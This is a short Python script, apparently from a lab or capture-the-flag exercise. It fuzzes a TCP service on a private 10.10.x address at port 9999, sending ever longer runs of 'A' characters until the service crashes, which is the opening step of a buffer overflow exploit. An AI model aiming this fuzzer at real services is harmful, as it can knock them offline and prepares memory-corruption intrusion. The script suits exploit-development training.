#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.148.187"

port = 9999
timeout = 5

string =  "A" * 1000

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) ))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string)))
    sys.exit(0)
  string += 1000 * "A"
  time.sleep(1)
